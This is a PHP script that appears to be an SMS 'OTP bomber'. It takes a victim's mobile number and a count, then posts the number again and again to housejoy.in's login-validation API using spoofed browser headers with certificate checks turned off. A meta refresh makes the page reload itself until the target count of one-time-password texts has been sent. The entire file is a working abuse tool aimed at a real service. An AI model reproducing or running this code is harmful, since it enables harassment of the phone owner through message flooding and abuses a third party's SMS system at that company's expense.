
<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent>=$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	$cansend=5;
for ($i=0;$i<=$cansend;$i++){

$data='{"mobileNumber":"'.$mobno.'"}';
 $url="https://www.housejoy.in/api/user/validate";
         //header here
         $headers   = array();
        $headers[] = "Host:www.housejoy.in";
		$headers[] = "Connection:keep-alive";
		$headers[] = "Content-Length:29";
		$headers[] = "Accept:application/json, text/plain, */*";
		$headers[] = "User-Agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
		$headers[] = "Content-Type:application/json;charset=UTF-8";
		$headers[] = "Origin:https://www.housejoy.in";
		$headers[] = "Sec-Fetch-Site:same-origin";
		$headers[] = "Sec-Fetch-Mode:cors";
		$headers[] = "sec-fetch-dest:empty";
		$headers[] = "Referer:https://www.housejoy.in/login";
		$headers[] = "accept-encoding:gzip, deflate, br";
		$headers[] = "accept-language:en-US,en;q=0.9";
        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    

}
	//code in for loop 
	$sentinc=$sent+$cansend;
   $rl="fast5.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
  
	?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="1; '.$rl.'">';
}
?>